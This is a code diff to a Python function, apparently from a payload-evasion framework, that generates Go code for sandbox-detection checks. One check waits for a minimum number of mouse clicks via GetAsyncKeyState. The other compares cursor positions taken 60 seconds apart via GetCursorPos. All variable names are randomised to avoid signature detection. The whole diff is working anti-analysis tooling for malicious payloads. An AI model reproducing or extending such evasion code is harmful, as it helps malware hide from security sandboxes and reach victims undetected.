@@ -807,6 +807,55 @@ def senecas_games(evasion_payload):
             check_code += '}\n'
             check_code += 'if len(' + evd_sandbox + ') == 0 {\n'
             num_tabs_required += 1
+        
+        if evasion_payload.required_options["CLICKTRACK"][0].lower() != 'x':
+            
+            usr32 = evasion_helpers.randomString()
+            getkey_state = evasion_helpers.randomString()
+            counter = evasion_helpers.randomString()
+            min_clicks = evasion_helpers.randomString()
+            lft_click = evasion_helpers.randomString()
+            rght_click = evasion_helpers.randomString()
+
+            check_code += 'var ' + usr32 + ' = syscall.NewLazyDLL("user32.dll")\n'
+            check_code += 'var ' + getkey_state + ' = ' + usr32 + '.NewProc("GetAsyncKeyState")\n'
+            check_code += 'var ' + counter + ' = 0\n'
+            check_code += 'var ' + min_clicks + ' = ' + evasion_payload.required_options["CLICKTRACK"][0] + '\n'
+            check_code += 'for ' + counter + ' < ' + min_clicks + ' {\n'
+            check_code += '\t' + lft_click + ', _, _ := ' + getkey_state + '.Call(uintptr(0x1))\n'
+            check_code += '\t' + rght_click + ', _, _ := ' + getkey_state + '.Call(uintptr(0x2))\n'
+            check_code += '\tif ' + lft_click + ' % 2 == 1 {\n'
+            check_code += '\t\t' + counter + ' += 1\n'
+            check_code += '\t}\n'
+            check_code += '\tif ' + rght_click + ' % 2 == 1 {\n'
+            check_code += '\t\t' + counter + ' += 1\n'
+            check_code += '\t}\n'
+            check_code += '}\n'
+            check_code += 'if true {\n'
+            num_tabs_required += 1
+        
+        if evasion_payload.required_options["CURSORCHECK"][0].lower() != 'false':
+            
+            usr32 = evasion_helpers.randomString()
+            cursor_position = evasion_helpers.randomString()
+            point_struct = evasion_helpers.randomString()
+            secs = evasion_helpers.randomString()
+            point_var1 = evasion_helpers.randomString()
+            point_var2 = evasion_helpers.randomString()
+
+            check_code += 'type ' + point_struct + ' struct {\n'
+            check_code += '\tx, y int32\n'
+            check_code += '}\n'
+            check_code += 'var ' + usr32 + ' = syscall.NewLazyDLL("user32.dll")\n'
+            check_code += 'var ' + cursor_position + ' = ' + usr32 + '.NewProc("GetCursorPos")\n'
+            check_code += secs + ' := 60\n'
+            check_code += point_var1 + ' := ' + point_struct + '{}\n'
+            check_code += cursor_position + '.Call(uintptr(unsafe.Pointer(&' + point_var1 + ')))\n'
+            check_code += 'time.Sleep(time.Duration(' + secs + ' * 1000)  * time.Millisecond)\n'
+            check_code += point_var2 + ' := ' + point_struct + '{}\n'
+            check_code += cursor_position + '.Call(uintptr(unsafe.Pointer(&' + point_var2 + ')))\n'
+            check_code += 'if ' + point_var1 + '.x - ' + point_var2 + '.x == 0 && ' + point_var1 + '.y - ' + point_var2 + '.y == 0 {\n'
+            num_tabs_required += 1
 
         # Return check information
         return check_code, num_tabs_required
